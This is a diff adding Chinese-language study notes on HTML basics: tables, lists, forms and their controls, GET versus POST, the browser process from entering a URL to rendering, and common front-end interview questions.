+<td>就是一个四方的盒子</td>
+</tr>
+<tr>
+<td><tr></tr></td>
+<td>表格行标签</td>
+<td>行标签要再table标签内部才有意义</td>
+</tr>
+<tr>
+<td><td></td></td>
+<td>单元格标签</td>
+<td>单元格标签是个容器级元素，可以放任何东西</td>
+</tr>
+<tr>
+<td><th></th></td>
+<td>表头单元格标签</td>
+<td>它还是一个单元格，但是里面的文字会居中且加粗</td>
+</tr>
+<tr>
+<td><caption></caption></td>
+<td>表格标题标签</td>
+<td>表格的标题，跟着表格一起走，和表格居中对齐</td>
+</tr>
+<tr>
+<td>clospan 和 rowspan</td>
+<td>合并属性</td>
+<td>用来合并单元格的</td>
+</tr>
+</tbody>
+</table>
+<p>**「**<strong>6.</strong> <strong>表格划分结构」</strong></p>
+<p>对于比较复杂的表格，表格的结构也就相对的复杂了，所以又将表格分割成三个部分：题头、正文和脚注。而这三部分分别用:thead,tbody,tfoot来标注， 这样更好的分清表格结构。</p>
+<p><strong>注意：</strong><br>
+1.<thead></thead>：用于定义表格的头部。用来放标题之类的东西。<thead> 内部必须拥有<tr> 标签！<br>
+\2. <tbody></tbody>：用于定义表格的主体。放数据本体 。<br>
+\3. <tfoot></tfoot>放表格的脚注之类。<br>
+\4. 以上标签都是放到table标签中。</p>
+<p><strong>列表</strong></p>
+<p>**「列表<strong><strong>ul</strong></strong>」**容器里面装载着结构，样式一致的文字或图表的一种形式，叫列表。</p>
+<p>列表最大的特点就是整齐 、整洁、 有序，跟表格类似，但是它可组合自由度会更高。</p>
+<p><strong>「<strong><strong>1.</strong> <strong>无序列表</strong> <strong>ul</strong></strong>」</strong></p>
+<ul>
+<li>
+<ul></ul>中只能嵌套<li></li>，直接在<ul></ul>标签中输入其他标签或者文字的做法是不被允许的。
+</li>
+<li>
+<li>与</li>之间相当于一个容器，可以容纳所有元素。
+</li>
+</ul>
+<ul>
+  <li>列表项1</li>
+  <li>列表项2</li>
+  <li>列表项3</li>
+  ......
+ </ul>
+<p><strong>「<strong><strong>2.</strong> <strong>有序列表</strong> <strong>ol</strong></strong>」</strong></p>
+<ul>
+<li>
+<ol>标签中的type属性值为排序的序列号，不添加type属性时，有序列表默认从数字1开始排序。
+</li>
+<li>常用的type属性值分别为是1，a，A，i，I</li>
+<li>
+<ol reversed="reversed">中的reversed属性能够让有序列表中的序列倒序排列。
+</li>
+<li>
+<ol start="3">中的start属性值为3，有序列表中的第一个序列号将从3开始排列。
+</li>
+</ul>
+<ol type="A"> 
+  <li>列表项1</li>
+  <li>列表二</li>
+  <li>列表三</li>
+ </ol>
+<p><strong>「<strong><strong>2.</strong> <strong>自定义列表</strong> <strong>dl</strong></strong>」</strong></p>
+<ul>
+<li>定义列表常用于对术语或名词进行解释和描述，定义列表的列表项前没有任何项目符号。</li>
+</ul>
+<dl>   <dt>名词1</dt>   <dd>名词1解释1</dd>   <dd>名词1解释2</dd>   ...   <dt>名词2</dt>   <dd>名词2解释1</dd>   <dd>名词2解释2</dd>   ... </dl>
+<p><img src="../images/clip_image014-16485485492647.png" alt="图片"></p>
+<p><strong>表单</strong></p>
+<p>在HTML中，一个完整的表单通常由<strong>表单控件</strong>（也称为表单元素）、<strong>提示信息</strong>和<strong>表单域</strong>3个部分构成。表单目的是为了收集用户信息。</p>
+<p><img src="../images/clip_image016-16485485492648.png" alt="图片"><strong>表单控件：</strong><br>
+包含了具体的表单功能项，如单行文本输入框、密码输入框、复选框、提交按钮、重置按钮等。<br>
+<strong>提示信息：</strong><br>
+一个表单中通常还需要包含一些说明性的文字，提示用户进行填写和操作。<br>
+<strong>表单域：</strong><br>
+它相当于一个容器，用来容纳所有的表单控件和提示信息，可以通过他定义处理表单数据所用程序的url地址，以及数据提交到服务器的方法。如果不定义表单域，表单中的数据就无法传送到后台服务器。</p>
+<p>**「**<strong>1. input</strong> <strong>控件」</strong></p>
+<input type="属性值" value="你好">
+<ul>
+<li>input 输入的意思</li>
+<li><input />标签为单标签</li>
+<li>type属性设置不同的属性值用来指定不同的控件类型</li>
+<li>除了type属性还有别的属性</li>
+</ul>
+<p><strong>常用属性：</strong></p>
+<p><img src="../images/clip_image018-16485485492649.jpg" alt="图片"></p>
+<p>用户名: <input type="text" /><br>
+密 码：<input type="password" /></p>
+<p><strong>value****属性</strong></p>
+<ul>
+<li>value 默认的文本值。有些表单想刚打开页面就默认显示几个文字，就可以通过这个value     来设置。</li>
+</ul>
+<p>用户名:<input type="text" name="username" value="请输入用户名"></p>
+<p><strong>name****属性</strong></p>
+<ul>
+<li>
+<p>name表单的名字， 这样，后台可以通过这个name属性找到这个表单。 页面中的表单很多，name主要作用就是用于区别不同的表单。</p>
+</li>
+<li>
+<ul>
+<li>name属性后面的值，是我们自己定义的。</li>
+<li>radio  如果是一组，我们必须给他们命名相同的名字 name       这样就可以多个选其中的一个啦</li>
+<li>name属性，我们现在用的较少，但是，当我们学ajax 和后台的时候，是必须的。</li>
+</ul>
+</li>
+</ul>
+<p><input type="radio" name="sex" />男<br>
+<input type="radio" name="sex" />女</p>
+<p><strong>checked****属性</strong></p>
+<ul>
+<li>表示默认选中状态。 较常见于 单选按钮和复选按钮。</li>
+</ul>
+<p>性  别:<br>
+<input type="radio" name="sex" value="男" checked="checked" />男<br>
+<input type="radio" name="sex" value="女" />女</p>
+<p><strong>input</strong> <strong>属性小结</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>属性</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>type</td>
+<td>表单类型</td>
+<td>用来指定不同的控件类型</td>
+</tr>
+<tr>
+<td>value</td>
+<td>表单值</td>
+<td>表单里面默认显示的文本</td>
+</tr>
+<tr>
+<td>name</td>
+<td>表单名字</td>
+<td>页面中的表单很多，name主要作用就是用于区别不同的表单。</td>
+</tr>
+<tr>
+<td>checked</td>
+<td>默认选中</td>
+<td>表示那个单选或者复选按钮一开始就被选中了</td>
+</tr>
+</tbody>
+</table>
+<p><strong>「<strong><strong>2.  label</strong></strong>标签」</strong></p>
+<ul>
+<li>label 标签为 input 元素定义标注（标签）。</li>
+<li>label标签主要目的是为了提高用户体验。为用户提高最优秀的服务。</li>
+</ul>
+<p>**作用：**用于绑定一个表单元素, 当点击label标签的时候, 被绑定的表单元素就会获得输入焦点。</p>
+<p><strong>如何绑定元素呢</strong></p>
+<ul>
+<li>第一种用法就是用label标签直接包含input表单， 适合单个表单选择</li>
+<li>第二种用法 for 属性规定 label 与哪个表单元素绑定(通过id)。</li>
+</ul>
+<p>第一种<br>
+<label> 用户名：<br>
+<input type="radio" name="usename" value="请输入用户名"><br>
+</label></p>
+<p>第二种<br>
+<label for="sex">男</label><br>
+<input type="radio" name="sex" id="sex"></p>
+<p><strong>「<strong><strong>3.  textarea</strong></strong>控件</strong>**(<strong><strong>文本域</strong></strong>)****」**</p>
+<ul>
+<li>通过textarea控件可以轻松地创建多行文本输入框.</li>
+<li>cols=“每行中的字符数” rows=“显示的行数”      我们实际开发不用</li>
+</ul>
+<p><img src="../images/clip_image020-164854854926410.jpg" alt="图片"></p>
+ <textarea >
+   文本内容
+  </textarea>
+<p><strong>文本框和文本域区别</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>表单</strong></th>
+<th><strong>名称</strong></th>
+<th><strong>区别</strong></th>
+<th><strong>默认值显示</strong></th>
+<th><strong>用于场景</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>input type=“text”</td>
+<td>文本框</td>
+<td>只能显示一行文本</td>
+<td>单标签，通过value显示默认值</td>
+<td>用户名、昵称、密码等</td>
+</tr>
+<tr>
+<td>textarea</td>
+<td>文本域</td>
+<td>可以显示多行文本</td>
+<td>双标签，默认值写到标签中间</td>
+<td>留言板</td>
+</tr>
+</tbody>
+</table>
+<p><strong>「<strong><strong>4.  select</strong></strong>下拉列表」</strong></p>
+<ul>
+<li>如果有多个选项让用户选择，为了节约空间，我们可以使用select控件定义下拉列表。</li>
+<li>在option 中定义**selected =&quot; selected     &quot;**时，当前项即为默认选中项。</li>
+<li>我们实际开发会用的比较少</li>
+</ul>
+<p><img src="../images/clip_image021-164854854926511.png" alt="图片"></p>
+<select>
+  <option>选项1</option>
+  <option>选项2</option>
+  <option>选项3</option>
+  ...
+ </select>
+<p><strong>form****表单域</strong></p>
+<ul>
+<li>
+<p>收集的用户信息怎么传递给服务器？</p>
+</li>
+<li>
+<ul>
+<li>通过<strong>form****表单域</strong></li>
+</ul>
+</li>
+<li>
+<p>目的：</p>
+</li>
+<li>
+<ul>
+<li>在HTML中，form标签被用于定义表单域，以实现用户信息的收集和传递，form中的所有内容都会被提交给服务器。</li>
+</ul>
+</li>
+</ul>
+<form action="url地址" method="提交方式" name="表单名称">
+  各种表单控件
+ </form>
+<p><strong>常用属性：</strong></p>
+<ul>
+<li>每个表单都应该有自己表单域。后面学 <strong>ajax</strong> <strong>后台交互</strong>的时候，必须需要form表单域。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>属性</strong></th>
+<th><strong>属性值</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>action</td>
+<td>url地址</td>
+<td>用于指定接收并处理表单数据的服务器程序的url地址。</td>
+</tr>
+<tr>
+<td>method</td>
+<td>get/post</td>
+<td>用于设置表单数据的提交方式，其取值为get或post。</td>
+</tr>
+<tr>
+<td>name</td>
+<td>名称</td>
+<td>用于指定表单的名称，以区分同一个页面中的多个表单。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>GET</strong> <strong>和</strong> <strong>POST</strong> <strong>的区别</strong></p>
+<ul>
+<li>GET在浏览器回退时是无害的，而POST会再次提交请求。</li>
+<li>GET请求会被浏览器主动cache，而POST不会，除非手动设置。</li>
+<li>GET请求只能进行url编码，而POST支持多种编码方式。</li>
+<li>GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。</li>
+<li>GET请求大小一般是(1024字节)，http协议并没有限制，而与服务器，操作系统有关，POST理论上来说没有大小限制，http协议规范也没有进行大小限制，但实际上post所能传递的数据量根据取决于服务器的设置和内存大小。</li>
+<li>对参数的数据类型，GET只接受ASCII字符，而POST没有限制。</li>
+<li>GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。</li>
+</ul>
+<p><strong>团队约定：</strong></p>
+<ul>
+<li>元素属性值使用双引号语法</li>
+<li>元素属性值可以写上的都写上</li>
+</ul>
+<p>推荐<br>
+<input type="text" /><br>
+<input type="radio" name="name" checked="checked" /></p>
+<p><strong>从输入<strong><strong>url</strong></strong>到页面展示发生了什么</strong>**(<strong><strong>面试</strong></strong>)**</p>
+<p>作者：Twinkle_<br>
+链接：<a target="_blank" rel="noopener" href="https://juejin.im/post/6869279683230629896">https://juejin.im/post/6869279683230629896</a><br>
+来源：掘金</p>
+<p><strong>浏览器的多进程架构</strong></p>
+<p>从浏览器输入 <strong>URL</strong> 到页面渲染的整个过程都是由 浏览器架构中的各个进程之间的配合完成。</p>
+<ol>
+<li><strong>浏览器主进程</strong>: 管理子进程、提供服务功能</li>
+<li><strong>渲染进程</strong>：将HTML、CSS、JS渲染成界面，js引擎v8和排版引擎Blink就在上面，他会为每一个tab页面创建一个渲染进程</li>
+<li><strong>GPU****进程</strong>：本来是负责处理3Dcss的，后来慢慢的UI界面也交给GPU来绘制</li>
+<li><strong>网络进程</strong>：就是负责网络请求，网络资源加载的进程</li>
+<li><strong>插件进程</strong>：负责插件的运行的，因为插件很容易崩溃，把它放到独立的进程里不要让它影响别人</li>
+</ol>
+<p><strong>浏览器的多进程架构</strong></p>
+<p>从用户输入信息到页面展示的不同阶段，是不同的进程在发挥作用，示意图如下：<img src="../images/clip_image023-164854854926512.jpg" alt="图片">从图中可以看出，整个过程是需要各个进程之间相互配合完成的，过程大致可以描述为：</p>
+<ol>
+<li>用户输入url,处理输入信息，主进程开始导航，交给网络进程干活</li>
+<li>网络进程发起网络请求，其中有可能会发生重定向</li>
+<li>服务器响应URL之后，主进程就要通知渲染进程，你要开始干活了</li>
+<li>渲染进程准备好了，要想渲染进程提交数据，这个时间叫做提交文档</li>
+<li>渲染进程接受到数据，完成页面渲染。</li>
+</ol>
+<p><strong>具体过程</strong></p>
+<ol>
+<li>输入url</li>
+</ol>
+<ul>
+<li>用户输入url，处理输入信息：</li>
+<li>如果为非url结构的字符串，交给浏览器<strong>默认引擎</strong>去搜索改字符串；</li>
+<li>若为url结构的字符串，浏览器主进程会交给 <strong>网络进程</strong> ,开始干活。</li>
+</ul>
+<p>2.1 查找浏览器缓存</p>
+<ul>
+<li>网络进程会先看看是否存在本地缓存，如果有就直接返回资源给浏览器进程，无则下一步 DNS-&gt; IP -&gt; TCP</li>
+</ul>
+<p>2.2 DNS解析</p>
+<ul>
+<li>网络进程拿到url后，先会进行DNS域名解析得到<strong>IP****地址</strong>。如果请求协议是HTTPS，那么还需要建立TLS连接。</li>
+</ul>
+<p>2.2 建立TCP连接，三次握手</p>
+<ul>
+<li>接下来就是利用IP地址和服务器建立TCP连接。连接建立之后，向服务器发送请求。</li>
+</ul>
+<ol>
+<li>服务器响应</li>
+</ol>
+<ul>
+<li>服务器收到请求信息后，会根据请求信息生成响应行、响应头、响应体，并发给网络进程。网络进程接受了响应信息之后，就开始解析响应头的内容。</li>
+<li><strong>网络进程解析响应行和响应头信息的过程：</strong></li>
+</ul>
+<p>3.1 重定向</p>
+<ul>
+<li>如果响应行状态码为301（永久重定向）和302（临时），那么说明需要重定向到其他url。这时候网络进程会从响应头中的Location字段里读取重定向的地址，并重新发起网络请求。</li>
+</ul>
+<p>3.2 响应数据处理</p>
+<ul>
+<li>导航会通过请求头的<strong>Content-type</strong>字段判断响应体数据的类型。浏览器通过这个来决定如何显示响应体的内容。比如：若为application/octet-stream，则会按照下载类型来处理这个请求，导航结束。若为text/html，这就告诉浏览器服务器返回的是html格式，浏览器会通知渲染进程，你要干活了。</li>
+</ul>
+<ol>
+<li>准备渲染进程</li>
+</ol>
+<ul>
+<li>默认情况，每个页面一个渲染进程。但若处于<strong>同一站点</strong>（同根域名+协议），那么渲染进程就会复用。</li>
+</ul>
+<ol>
+<li>提交文档</li>
+</ol>
+<ul>
+<li>渲染进程准备好后，浏览器进程发出**“<strong><strong>提交文档的消息</strong></strong>”**，渲染进程接受了消息之后，会跟网络进程简历传输数据的管道。</li>
+<li>等数据传输完成了，渲染进程会告诉浏览器进程，<strong>确认文档提交</strong>，这时候浏览器会更新页面，安全状态，url，前进后退的历史。</li>
+<li>到这里导航结束，进入渲染阶段。</li>
+</ul>
+<p>注：当浏览器刚开始加载一个地址之后，标签页上的图标便进入了加载状态。但此时图中页面显示的依然是之前打开的页面内容，并没立即替换为百度首页的页面。因为需要等待提交文档阶段，页面内容才会被替换。</p>
+<p><strong>前端<strong><strong>HTML</strong></strong>基础面试题</strong></p>
+<p><strong>iframe****有哪些缺点？</strong></p>
+<p>iframe是一种框架，也是一种很常见的网页嵌入方式。</p>
+<p><strong>「<strong><strong>iframe</strong></strong>的优点」</strong></p>
+<ul>
+<li>iframe能够原封不动的把嵌入的网页展现出来。</li>
+<li>如果有多个网页引用iframe，那么你只需要修改iframe的内容，就可以实现调用的每一个页面内容的更改，方便快捷。</li>
+<li>网页如果为了统一风格，头部和版本都是一样的，就可以写成一个页面，用iframe来嵌套，可以增加代码的可重用。</li>
+<li>如果遇到加载缓慢的第三方内容如图标和广告，这些问题可以由iframe来解决。</li>
+</ul>
+<p><strong>「<strong><strong>iframe</strong></strong>的缺点」</strong></p>
+<ul>
+<li>会产生很多页面，不容易管理。</li>
+<li>iframe框架结构有时会让人感到迷惑，如果框架个数多的话，可能会出现上下、左右滚动条，会分散访问者的注意力，用户体验度差。</li>
+<li>代码复杂，无法被一些搜索引擎索引到，这一点很关键，现在的搜索引擎爬虫还不能很好的处理iframe中的内容，所以使用iframe会不利于搜索引擎优化。</li>
+<li>很多的移动设备（PDA 手机）无法完全显示框架，设备兼容性差。</li>
+<li>iframe框架页面会增加服务器的http请求，对于大型网站是不可取的。</li>
+<li>现在基本上都是用Ajax来代替iframe，所以iframe已经渐渐的退出了前端开发。</li>
+</ul>
+<p><strong>label****的作用是什么？是怎么用的？</strong></p>
+<p>例子1: 点击&quot; 用户名:&quot; 就可以定位光标到输入框</p>
+<form><label for="myid "> 用户名:</label>
+ <input type="text" id="myid" /></form> 
+<p>例子2: 点击&quot; 用户名:&quot; 或按键alt+1, 都可以定位光标到输入框</p>
+<form>
+   <label for="myid" accesskey="1"> 用户名:</label>
+   <input type="text" id="myid" tabindex="1" />
+ </form> 
+<p><strong>for</strong> <strong>属性</strong>功能：表示Label 标签要绑定的HTML 元素，你点击这个标签的时候，所绑定的元素将获取焦点。</p>
+<p><strong>acesskey</strong> <strong>属性</strong><br>
+**功能：**表示访问Label 标签所绑定的元素的热键，当您按下热键，所绑定的元素将获取焦点。<br>
+**局限性：**accessKey 属性所设置的快捷键不能与浏览器的快捷键冲突，否则将优先激活浏览器的快捷键。</p>
+<p><strong>HTML5<strong><strong>的</strong></strong>form****如何关闭自动完成功能？</strong></p>
+<p>HTML的输入框可以拥有自动完成的功能，当你往输入框输入内容的时候，浏览器会从你以前的同名输入框的历史记录中查找出类似的内容并列在输入框下面，这样就不用全部输入进去了，直接选择列表中的项目就可以了。<br>
+但有时候我们希望关闭输入框的自动完成功能，例如当用户输入内容的时候，我们希望使用AJAX技术从数据库搜索并列举而不是在用户的历史记录中搜索。</p>
+<p><strong>关闭输入框的自动完成功能有<strong><strong>3</strong></strong>种方法：</strong></p>
+<ol>
+<li>在IE的Internet选项菜单里的内容–自动完成里面设置</li>
+<li>设置form的autocomplete为&quot;on&quot;或者&quot;off&quot;来开启或者关闭自动完成功能</li>
+<li>设置输入框的autocomplete为&quot;on&quot;或者&quot;off&quot;来开启或者关闭该输入框的自动完成功能</li>
+</ol>
+<p><strong>将</strong> <strong>HTML5</strong> <strong>看作成开放的网络平台</strong></p>
+<p><strong>「什么是</strong> <strong>HTML5</strong> <strong>的基本构件（<strong><strong>building block</strong></strong>）？」</strong></p>
+<ol>
+<li>语义 - 提供更准确地描述内容。</li>
+<li>连接 - 提供新的方式与服务器通信。</li>
+<li>离线和存储 - 允许网页在本地存储数据并有效地离线运行。</li>
+<li>多媒体 - 在 Open Web 中，视频和音频被视为一等公民（first-class citizens）。</li>
+<li>2D/3D 图形和特效 - 提供更多种演示选项。</li>
+<li>性能和集成 - 提供更快的访问速度和性能更好的计算机硬件。</li>
+<li>设备访问 - 允许使用各种输入、输出设备。</li>
+<li>外观 - 可以开发丰富的主题。</li>
+</ol>
+<p><strong>浏览器是怎么对<strong><strong>HTML5</strong></strong>的离线储存资源进行管理和加载的呢？</strong></p>
+<p>在浏览器的html头部加上manifest属性，如果是第一次访问浏览器会根据manifest的内容进行下载存储离线内容，如果已经访问过则从离线存储中进行加载，然后在比对服务器如果有新内容在更新离线存储<br>
+离线的情况下，浏览器就直接使用离线存储的资源。</p>
+<p><strong>浏览器的渲染过程？</strong></p>
+<p>1、将获取的html解析成dom树<br>
+2、处理css，构成层叠样式表模型CSSOM<br>
+3、将dom树和CSSOM合并为渲染树<br>
+4、根据CSSOM将渲染树的节点布局计算<br>
+5、将渲染树节点样式绘制到页面上</p>
+<p>// 注意<br>
+在渲染的过程中是自上而下渲染，<br>
+js会阻塞页面的渲染，优先等js执行完成<br>
+如果在渲染的过程中改变了样式，会造成回流需要重新渲染</p>
+<p><strong>link<strong><strong>和</strong></strong>@import****的区别？</strong></p>
+<p>1、从属关系区别：<br>
+link属于html标签，而@import是css提供的。<br>
+2、加载顺序区别：<br>
+页面被加载时，link会同时被加载，而@import引用的css会等到页面被加载完再加载。<br>
+3、兼容性区别：<br>
+import只在IE5以上才能识别，而link是html标签，无兼容问题。<br>
+4、dom可操作性区别：<br>
+可以通过JS 操作 DOM ，插入link标签来改变样式；由于 DOM 方法是基于文档的，无法使用@import的方式插入样式<br>
+5、权重区别：<br>
+如果已经存在相同样式，@import引入的这个样式将被该 CSS 文件本身的样式层叠掉，表现出link方式的样式权重高于@import的权重这样的直观效果。<br>
+（简而言之，link和@import，谁写在后面，谁的样式就被应用，后面的样式覆盖前面的样式。）</p>
+<p><strong>src<strong><strong>与</strong></strong>href****的区别？</strong></p>
+<p>1、href 是指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接，用于超链接。<br>
+2、src是指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求src资源时会将</p>
+<p><strong>「学习笔记」<strong><strong>HTML</strong></strong>基础</strong></p>
+<p><strong>前言</strong></p>
+<p>勤做笔记不仅可以让自己学的扎实，更重要的是可以让自己少走弯路。有人说:“再次翻开笔记是什么感觉”，我的回答是:“初恋般的感觉”。或许笔记不一定十全十美，但肯定会让你有种初恋般的怦然心动。💖💖<br>
+本章着重复习Html的基础内容，学习Html究竟要学些什么呢？主要是学习各种标签，来搭建网页的“结构”。✨✨<br>
+本篇文章主要由五个章节构成，从WEB标准到初识HTML，接着学习HTML常用标签，最后学习表格列表和表单。💪💪开始充电之旅啦~~~</p>
+<p><strong>一、认识****WEB</strong></p>
+<p><strong>「网页」<strong>主要是由</strong>文字</strong>、<strong>图像</strong>和<strong>超链接</strong>等元素构成，当然除了这些元素，网页中还可以包括音频、视频以及Flash等。</p>
+<p>**「浏览器」**是网页显示、运行的平台。</p>
+<p><strong>「浏览器内核」</strong>(排版引擎、解释引擎、渲染引擎)</p>
+<p>负责读取网页内容，整理讯息，计算网页的显示方式并显示页面。</p>
+<table>
+<thead>
+<tr>
+<th><strong>浏览器</strong></th>
+<th><strong>内核</strong></th>
+<th><strong>备注</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IE</td>
+<td>Trident</td>
+<td>IE、猎豹安全、360极速浏览器、百度浏览器</td>
+</tr>
+<tr>
+<td>firefox</td>
+<td>Gecko</td>
+<td>可惜这几年已经没落了，打开速度慢、升级频繁、猪一样的队友flash、神一样的对手chrome。</td>
+</tr>
+<tr>
+<td>Safari</td>
+<td>webkit</td>
+<td>现在很多人错误地把 webkit 叫做 chrome内核（即使 chrome内核已经是 blink 了）。苹果感觉像被别人抢了媳妇，都哭晕在厕所里面了。</td>
+</tr>
+<tr>
+<td>chrome</td>
+<td>Chromium/Blink</td>
+<td>在 Chromium 项目中研发 Blink 渲染引擎（即浏览器核心），内置于 Chrome 浏览器之中。Blink 其实是 WebKit 的分支。大部分国产浏览器最新版都采用Blink内核。二次开发</td>
+</tr>
+<tr>
+<td>Opera</td>
+<td>blink</td>
+<td>现在跟随chrome用blink内核。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Web****标准</strong></p>
+<p>**「构成」**👉 <strong>结构标准，表现标准和行为标准</strong></p>
+<ul>
+<li><strong>结构标准</strong>用于对网页元素进行整理和分类(HTML)</li>
+<li><strong>表现标准</strong>用于设置网页元素的版式、颜色、大小等外观属性(CSS)</li>
+<li><strong>行为标准</strong>用于对网页模型的定义及交互的编写(JavaScript)</li>
+</ul>
+<p>**「<strong><strong>Web</strong></strong>标准的优点」**👇</p>
+<ul>
+<li><strong>易于维护</strong>：只需更改CSS文件，就可以改变整站的样式</li>
+<li><strong>页面响应快</strong>：HTML文档体积变小，响应时间短</li>
+<li><strong>可访问性</strong>：语义化的HTML（结构和表现相分离的HTML）编写的网页文件，更容易被屏幕阅读器识别</li>
+<li><strong>设备兼容性</strong>：不同的样式表可以让网页在不同的设备上呈现不同的样式</li>
+<li><strong>搜索引擎</strong>：语义化的HTML能更容易被搜索引擎解析，提升排名</li>
+</ul>
+<p><strong>二、<strong><strong>HTML</strong></strong>初识</strong></p>
+<p><strong>HTML****初识</strong></p>
+<p><strong>「<strong><strong>HTML</strong></strong>」</strong>(Hyper Text Markup Language):超文本标记语言</p>
+<p><strong>「所谓超文本，有<strong><strong>2</strong></strong>层含义：」</strong></p>
+<ul>
+<li>因为它可以加入图片、声音、动画、多媒体等内容**（超越文本限制** <strong>）</strong></li>
+<li>不仅如此，它还可以从一个文件跳转到另一个文件，与世界各地主机的文件连接**（超级链接文本）**。</li>
+</ul>
+<p><strong>「<strong><strong>HTML</strong></strong>骨架格式」</strong></p>
+<!-- 页面中最大的标签 根标签 -->
+ <html>
+   <!-- 头部标签 -->
+   <head>   
+     <!-- 标题标签 -->
+     <title></title> 
+   </head>
+   <!-- 文档的主体 -->
+   <body>
+   </body>
+ </html>
+<p><strong>「团队约定大小写」</strong></p>
+<ul>
+<li>HTML标签名、类名、标签属性和大部分属性值统一用小写</li>
+</ul>
+<p><strong>「<strong><strong>HTML</strong></strong>元素标签分类」</strong></p>
+<ul>
+<li>常规元素(双标签)</li>
+<li>空元素(单标签)</li>
+</ul>
+<p>常规元素(双标签)<br>
+&lt;标签名&gt; 内容 &lt;/标签名&gt;  比如<body>我是文字</body></p>
+<p>空元素(单标签)<br>
+&lt;标签名 /&gt; 比如 <br />或<br></p>
+<p><strong>「<strong><strong>HTML</strong></strong>标签关系」</strong></p>
+<ul>
+<li>
+<p><strong>嵌套关系</strong>父子级包含关系</p>
+</li>
+<li>
+<p><strong>并列关系</strong>兄弟级并列关系</p>
+</li>
+<li>
+<ul>
+<li>如果两个标签之间的关系是<strong>嵌套关系</strong>，子元素最好缩进一个tab键的身位（一个tab是4个空格）。如果是<strong>并列关系</strong>，最好上下对齐。</li>
+</ul>
+</li>
+</ul>
+<p><strong>文档类型</strong>**<!DOCTYPE >**</p>
+<p>**「文档类型」<strong>用来说明你用的XHTML或者HTML是什么版本。</strong><!DOCTYPE html>**告诉浏览器按照HTML5标准解析页面。</p>
+<p><strong>页面语言****lang</strong></p>
+<p><strong>lang</strong>指定该html标签内容所用的语言</p>
+ <html lang="en"> 
+  en 定义语言为英语 zh-CN定义语言为中文
+<p><strong>「<strong><strong>lang</strong></strong>的作用」</strong></p>
+<ul>
+<li>根据根据lang属性来设定不同语言的css样式，或者字体</li>
+<li>告诉搜索引擎做精确的识别</li>
+<li>让语法检查程序做语言识别</li>
+<li>帮助翻译工具做识别</li>
+<li>帮助网页阅读程序做识别</li>
+</ul>
+<p><strong>字符集</strong></p>
+<p><strong>「字符集」</strong>(Character set)是多个字符的集合,计算机要准确的处理各种字符集文字，需要进行字符编码，以便计算机能够识别和存储各种文字。</p>
+<ul>
+<li>
+<p>UTF-8是目前最常用的字符集编码方式</p>
+</li>
+<li>
+<p>让 html 文件是以 UTF-8 编码保存的， 浏览器根据编码去解码对应的html内容。</p>
+<meta charset="UTF-8" />
+</li>
+</ul>
+<p><strong>「<strong><strong>meta viewport</strong></strong>的用法」</strong><br>
+通常viewport是指视窗、视口。浏览器上(也可能是一个app中的webview)用来显示网页的那部分区域。在移动端和pc端视口是不同的，pc端的视口是浏览器窗口区域，而在移动端有三个不同的视口概念：布局视口、视觉视口、理想视口</p>
+<p>meta有两个属性name 和 http-equiv</p>
+<p><strong>name****属性的取值</strong></p>
+<ul>
+<li>keywords(关键字) 告诉搜索引擎，该网页的关键字</li>
+<li>description(网站内容描述) 用于告诉搜索引擎，你网站的主要内容。</li>
+<li>viewport(移动端的窗口)</li>
+<li>robots(定义搜索引擎爬虫的索引方式)     robots用来告诉爬虫哪些页面需要索引，哪些页面不需要索引</li>
+<li>author(作者)</li>
+<li>generator(网页制作软件）</li>
+<li>copyright(版权)</li>
+</ul>
+<p><strong>http-equiv****有以下参数</strong></p>
+<p><strong>http-equiv</strong>相当于http的文件头作用，它可以向浏览器传回一些有用的信息，以帮助正确和精确地显示网页内容</p>
+<ul>
+<li><strong>content-Type</strong> 设定网页字符集(Html4用法，不推荐)</li>
+<li><strong>Expires(<strong><strong>期限</strong></strong>)</strong> ,可以用于设定网页的到期时间。一旦网页过期，必须到服务器上重新传输。</li>
+<li><strong>Pragma(cache<strong><strong>模式</strong></strong>)</strong>,是用于设定禁止浏览器从本地机的缓存中调阅页面内容，设定后一旦离开网页就无法从Cache中再调出</li>
+<li><strong>Refresh(<strong><strong>刷新</strong></strong>)</strong>,自动刷新并指向新页面。</li>
+<li><strong>cache-control</strong>（请求和响应遵循的缓存机制）</li>
+</ul>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<p><strong>HTML****标签的语义化</strong></p>
+<ul>
+<li>方便代码的阅读和维护，样式丢失的时候能让页面呈现清晰的结构。</li>
+<li>有利于SEO，搜索引擎根据标签来确定上下文和各个关键字的权重。</li>
+<li>方便其他设备解析，如盲人阅读器根据语义渲染网页</li>
+</ul>
+<p><strong>「拓展」</strong> 标签：规定页面上所有链接的默认 URL 和设置整体链接的打开状态</p>
+<head>
+   <base href="http://www.baidu.com" target="_blank">
+   <base target="_self">
+ </head>
+ <body>
+   <a href="">测试</a> 跳转到 百度
+ </body>
+<p><strong>HTML****常用标签</strong></p>
+<p><strong>常用标签</strong></p>
+<p>**「**<strong>1.</strong> **排版标签」**主要和css搭配使用，显示网页结构的标签，是网页布局最常用的标签。</p>
+<ul>
+<li>标题标签h(h1~h6)</li>
+<li>段落标签p,可以把 HTML 文档分割为若干段落</li>
+<li>水平线标签hr</li>
+<li>换行标签br</li>
+<li>div和span标签:是没有语义的,是我们网页布局最主要的2个盒子。</li>
+</ul>
+<p>**「**<strong>2.</strong> <strong>排版标签」</strong></p>
+<ul>
+<li><strong>b</strong>和<strong>strong</strong> 文字以粗体显示</li>
+<li><strong>i</strong>和<strong>em</strong> 文字以斜体显示</li>
+<li><strong>s</strong>和<strong>del</strong> 文字以加删除线显示</li>
+<li><strong>u</strong>和<strong>ins</strong> 文字以加下划线显示</li>
+</ul>
